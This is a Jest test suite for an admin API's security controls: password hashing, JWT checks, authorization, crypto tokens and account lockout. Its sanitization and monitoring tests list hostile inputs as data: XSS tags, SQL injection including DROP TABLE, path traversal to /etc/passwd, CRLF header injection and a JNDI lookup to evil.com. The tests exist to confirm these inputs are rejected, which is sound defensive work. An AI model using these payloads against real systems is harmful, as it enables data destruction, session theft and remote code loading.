import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { PrismaClient } from '@prisma/client';
import request from 'supertest';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import { SecurityService } from '../src/services/SecurityService';
import { CryptoService } from '../src/services/CryptoService';
import { createTestApp } from './helpers/testApp';

const prisma = new PrismaClient();

describe('Admin Security Tests', () => {
  let app: any;
  let securityService: SecurityService;
  let cryptoService: CryptoService;

  beforeEach(async () => {
    app = createTestApp();
    securityService = new SecurityService();
    cryptoService = new CryptoService();

    // Clean up test data
    await prisma.session.deleteMany();
    await prisma.admin.deleteMany();
  });

  afterEach(async () => {
    // Clean up test data
    await prisma.session.deleteMany();
    await prisma.admin.deleteMany();
  });

  describe('Password Hashing with bcrypt', () => {
    test('should hash passwords with bcrypt before storing', async () => {
      const plainPassword = 'TestPassword123!';
      const hashedPassword = await bcrypt.hash(plainPassword, 10);

      expect(hashedPassword).not.toBe(plainPassword);
      expect(hashedPassword).toMatch(/^\$2[aby]\$.{56}$/); // bcrypt format
      expect(hashedPassword.length).toBe(60); // bcrypt hash length
    });

    test('should use proper bcrypt salt rounds', async () => {
      const password = 'TestPassword123!';
      const hash = await bcrypt.hash(password, 10);

      // Verify salt rounds are at least 10
      const saltRounds = parseInt(hash.split('$')[2]);
      expect(saltRounds).toBeGreaterThanOrEqual(10);
    });

    test('should verify passwords correctly with bcrypt', async () => {
      const password = 'TestPassword123!';
      const hash = await bcrypt.hash(password, 10);

      const isValid = await bcrypt.compare(password, hash);
      expect(isValid).toBe(true);

      const isInvalid = await bcrypt.compare('WrongPassword123!', hash);
      expect(isInvalid).toBe(false);
    });

    test('should generate different hashes for same password', async () => {
      const password = 'TestPassword123!';
      const hash1 = await bcrypt.hash(password, 10);
      const hash2 = await bcrypt.hash(password, 10);

      expect(hash1).not.toBe(hash2);

      // Both should verify correctly
      expect(await bcrypt.compare(password, hash1)).toBe(true);
      expect(await bcrypt.compare(password, hash2)).toBe(true);
    });

    test('should enforce minimum password hash strength', async () => {
      const weakSaltRounds = 5;

      // Service should reject weak salt rounds
      const result = await securityService.validateHashStrength(weakSaltRounds);
      expect(result.isValid).toBe(false);
      expect(result.message).toContain('Salt rounds must be at least 10');
    });

    test('should detect compromised password hashes', async () => {
      // MD5 hash (compromised)
      const md5Hash = '5d41402abc4b2a76b9719d911017c592';

      const isSafe = await securityService.validateHashSecurity(md5Hash);
      expect(isSafe).toBe(false);
    });

    test('should validate bcrypt hash format', async () => {
      const validBcryptHash = '$2b$10$rI/f0XWZB8UzA5h8q2.tL.QGl6b2VYGpJKmN2lWqvZUuOgP1xOX8q';
      const invalidHash = 'plain-text-password';

      expect(securityService.isBcryptHash(validBcryptHash)).toBe(true);
      expect(securityService.isBcryptHash(invalidHash)).toBe(false);
    });
  });

  describe('Session Token Validation', () => {
    test('should generate secure JWT tokens', async () => {
      const admin = await prisma.admin.create({
        data: {
          username: 'testadmin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const token = jwt.sign(
        { adminId: admin.id, username: 'testadmin', permissions: ['ADMIN'] },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '4h', algorithm: 'HS256' }
      );

      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'test-secret') as any;

      expect(decoded.adminId).toBe(admin.id);
      expect(decoded.username).toBe('testadmin');
      expect(decoded.permissions).toEqual(['ADMIN']);
      expect(decoded.exp).toBeGreaterThan(Math.floor(Date.now() / 1000));
    });

    test('should validate JWT signature integrity', async () => {
      const admin = await prisma.admin.create({
        data: {
          username: 'testadmin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const validToken = jwt.sign(
        { adminId: admin.id, username: 'testadmin' },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Tamper with token
      const tamperedToken = validToken.substring(0, validToken.length - 10) + 'tampered123';

      expect(() => {
        jwt.verify(tamperedToken, process.env.JWT_SECRET || 'test-secret');
      }).toThrow('invalid signature');
    });

    test('should reject tokens with weak signatures', async () => {
      const weakSecret = 'weak';

      const token = jwt.sign({ adminId: 'test' }, weakSecret);

      const response = await request(app)
        .get('/api/auth/verify')
        .set('Authorization', `Bearer ${token}`)
        .expect(401);

      expect(response.body.error).toContain('Invalid token');
    });

    test('should validate token expiration', async () => {
      const admin = await prisma.admin.create({
        data: {
          username: 'testadmin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const expiredToken = jwt.sign(
        { adminId: admin.id, username: 'testadmin' },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '-1h' } // Expired
      );

      const response = await request(app)
        .get('/api/auth/verify')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.code).toBe('TOKEN_EXPIRED');
    });

    test('should validate token claims', async () => {
      const tokenWithMissingClaims = jwt.sign(
        { username: 'testadmin' }, // Missing adminId
        process.env.JWT_SECRET || 'test-secret'
      );

      const response = await request(app)
        .get('/api/auth/verify')
        .set('Authorization', `Bearer ${tokenWithMissingClaims}`)
        .expect(401);

      expect(response.body.error).toContain('Invalid token claims');
    });

    test('should enforce token blacklisting', async () => {
      const admin = await prisma.admin.create({
        data: {
          username: 'testadmin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const token = jwt.sign(
        { adminId: admin.id, username: 'testadmin' },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Add token to blacklist
      await securityService.blacklistToken(token);

      const response = await request(app)
        .get('/api/auth/verify')
        .set('Authorization', `Bearer ${token}`)
        .expect(401);

      expect(response.body.error).toContain('Token has been revoked');
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize username input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE admins; --',
        '../../../etc/passwd',
        'admin\x00hidden',
        'admin${jndi:ldap://evil.com}'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/admin')
          .send({
            username: input,
            password: 'TestPassword123!',
            permissions: ['ADMIN']
          })
          .expect(400);

        expect(response.body.error).toContain('Invalid characters in username');
      }
    });

    test('should prevent SQL injection in queries', async () => {
      const sqlInjectionAttempts = [
        "' OR '1'='1",
        '; DROP TABLE admins; --',
        "admin'; UPDATE admins SET password='hacked' WHERE username='admin'; --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            username: injection,
            password: 'anypassword'
          })
          .expect(401);

        expect(response.body.code).toBe('INVALID_CREDENTIALS');
      }
    });

    test('should sanitize password input', async () => {
      const maliciousPassword = '<script>document.cookie</script>';

      const response = await request(app)
        .post('/api/admin')
        .send({
          username: 'testadmin',
          password: maliciousPassword,
          permissions: ['ADMIN']
        })
        .expect(400);

      expect(response.body.error).toContain('Invalid characters in password');
    });

    test('should validate JSON input structure', async () => {
      const malformedJson = '{"username": "test", "password": "test", "permissions": ["ADMIN"]}';

      // Test with extra fields that shouldn't be accepted
      const response = await request(app)
        .post('/api/admin')
        .send({
          username: 'testadmin',
          password: 'TestPassword123!',
          permissions: ['ADMIN'],
          maliciousField: '<script>alert("xss")</script>'
        })
        .expect(400);

      expect(response.body.error).toContain('Unexpected field: maliciousField');
    });

    test('should prevent header injection', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('User-Agent', 'Mozilla\r\nX-Injected-Header: injected')
        .send({
          username: 'testadmin',
          password: 'TestPassword123!'
        });

      // Header injection should be rejected or sanitized
      expect(response.headers['x-injected-header']).toBeUndefined();
    });
  });

  describe('Authorization Checks', () => {
    test('should require authentication for protected endpoints', async () => {
      const protectedEndpoints = [
        { method: 'GET', path: '/api/admin' },
        { method: 'POST', path: '/api/admin' },
        { method: 'PUT', path: '/api/admin/123' },
        { method: 'DELETE', path: '/api/admin/123' },
        { method: 'PUT', path: '/api/admin/password' }
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request(app)
          [endpoint.method.toLowerCase() as keyof typeof request.app](endpoint.path)
          .expect(401);

        expect(response.body.error).toContain('Authentication required');
      }
    });

    test('should validate admin permissions for restricted actions', async () => {
      const viewer = await prisma.admin.create({
        data: {
          username: 'viewer',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['VIEWER']
        }
      });

      const token = jwt.sign(
        { adminId: viewer.id, username: 'viewer', permissions: ['VIEWER'] },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Viewer should not be able to create admins
      const response = await request(app)
        .post('/api/admin')
        .set('Authorization', `Bearer ${token}`)
        .send({
          username: 'newadmin',
          password: 'TestPassword123!',
          permissions: ['ADMIN']
        })
        .expect(403);

      expect(response.body.error).toContain('Insufficient permissions');
    });

    test('should enforce role hierarchy', async () => {
      const operator = await prisma.admin.create({
        data: {
          username: 'operator',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['OPERATOR']
        }
      });

      const token = jwt.sign(
        { adminId: operator.id, username: 'operator', permissions: ['OPERATOR'] },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Operator should not be able to modify ADMIN users
      const admin = await prisma.admin.create({
        data: {
          username: 'admin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const response = await request(app)
        .put(`/api/admin/${admin.id}`)
        .set('Authorization', `Bearer ${token}`)
        .send({
          permissions: ['VIEWER']
        })
        .expect(403);

      expect(response.body.error).toContain('Cannot modify admin with higher privileges');
    });

    test('should prevent privilege escalation', async () => {
      const operator = await prisma.admin.create({
        data: {
          username: 'operator',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['OPERATOR']
        }
      });

      const token = jwt.sign(
        { adminId: operator.id, username: 'operator', permissions: ['OPERATOR'] },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Operator should not be able to grant themselves ADMIN permissions
      const response = await request(app)
        .put(`/api/admin/${operator.id}`)
        .set('Authorization', `Bearer ${token}`)
        .send({
          permissions: ['ADMIN']
        })
        .expect(403);

      expect(response.body.error).toContain('Cannot grant permissions higher than your own');
    });

    test('should validate session ownership', async () => {
      const admin1 = await prisma.admin.create({
        data: {
          username: 'admin1',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const admin2 = await prisma.admin.create({
        data: {
          username: 'admin2',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      const token1 = jwt.sign(
        { adminId: admin1.id, username: 'admin1', permissions: ['ADMIN'] },
        process.env.JWT_SECRET || 'test-secret'
      );

      // Admin1 should not be able to change Admin2's password
      const response = await request(app)
        .put('/api/admin/password')
        .set('Authorization', `Bearer ${token1}`)
        .set('X-Target-Admin-Id', admin2.id) // Attempting to target different admin
        .send({
          currentPassword: 'TestPassword123!',
          newPassword: 'NewPassword456!',
          confirmPassword: 'NewPassword456!'
        })
        .expect(403);

      expect(response.body.error).toContain('Cannot modify another admin\'s password');
    });
  });

  describe('Cryptographic Security', () => {
    test('should use secure random number generation', async () => {
      const randomTokens = new Set();

      // Generate multiple tokens to check for randomness
      for (let i = 0; i < 100; i++) {
        const token = await cryptoService.generateSecureToken();
        expect(token).toHaveLength(32); // Expected length
        expect(token).toMatch(/^[a-f0-9]+$/); // Hex format
        randomTokens.add(token);
      }

      // All tokens should be unique
      expect(randomTokens.size).toBe(100);
    });

    test('should generate cryptographically secure session IDs', async () => {
      const sessionIds = new Set();

      for (let i = 0; i < 50; i++) {
        const sessionId = await cryptoService.generateSessionId();
        expect(sessionId).toHaveLength(64); // 256 bits in hex
        expect(sessionId).toMatch(/^[a-f0-9]+$/);
        sessionIds.add(sessionId);
      }

      expect(sessionIds.size).toBe(50);
    });

    test('should validate CSRF token generation', async () => {
      const csrfToken = await cryptoService.generateCSRFToken();

      expect(csrfToken).toBeDefined();
      expect(csrfToken.length).toBeGreaterThanOrEqual(32);
      expect(typeof csrfToken).toBe('string');
    });

    test('should verify CSRF token validation', async () => {
      const token = await cryptoService.generateCSRFToken();
      const sessionId = 'test-session-id';

      const isValid = await cryptoService.validateCSRFToken(token, sessionId);
      expect(isValid).toBe(true);

      const isInvalid = await cryptoService.validateCSRFToken('invalid-token', sessionId);
      expect(isInvalid).toBe(false);
    });

    test('should use secure key derivation for sensitive data', async () => {
      const password = 'TestPassword123!';
      const salt = await cryptoService.generateSalt();

      const derivedKey1 = await cryptoService.deriveKey(password, salt);
      const derivedKey2 = await cryptoService.deriveKey(password, salt);

      // Same input should produce same output
      expect(derivedKey1).toBe(derivedKey2);

      // Different salt should produce different output
      const differentSalt = await cryptoService.generateSalt();
      const derivedKey3 = await cryptoService.deriveKey(password, differentSalt);
      expect(derivedKey1).not.toBe(derivedKey3);
    });

    test('should enforce secure communication headers', async () => {
      const response = await request(app)
        .get('/api/admin')
        .expect(401); // Will fail auth but should have security headers

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });
  });

  describe('Security Monitoring', () => {
    test('should log security events', async () => {
      const logSpy = jest.spyOn(console, 'warn').mockImplementation();

      // Attempt SQL injection
      await request(app)
        .post('/api/auth/login')
        .send({
          username: "'; DROP TABLE admins; --",
          password: 'anypassword'
        });

      expect(logSpy).toHaveBeenCalledWith(
        expect.stringContaining('Security violation detected: SQL injection attempt')
      );

      logSpy.mockRestore();
    });

    test('should detect suspicious activity patterns', async () => {
      const admin = await prisma.admin.create({
        data: {
          username: 'testadmin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      // Multiple failed login attempts from same IP should be flagged
      for (let i = 0; i < 10; i++) {
        await request(app)
          .post('/api/auth/login')
          .send({
            username: 'testadmin',
            password: 'wrongpassword'
          });
      }

      const suspiciousActivity = await securityService.checkSuspiciousActivity('127.0.0.1');
      expect(suspiciousActivity.isBlocked).toBe(true);
      expect(suspiciousActivity.reason).toContain('Multiple failed login attempts');
    });

    test('should implement account lockout after failed attempts', async () => {
      const admin = await prisma.admin.create({
        data: {
          username: 'testadmin',
          password: await bcrypt.hash('TestPassword123!', 10),
          permissions: ['ADMIN']
        }
      });

      // Attempt login failures
      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/api/auth/login')
          .send({
            username: 'testadmin',
            password: 'wrongpassword'
          })
          .expect(401);
      }

      // Account should be locked
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'testadmin',
          password: 'TestPassword123!' // Correct password
        })
        .expect(423);

      expect(response.body.error).toContain('Account temporarily locked');
    });
  });
});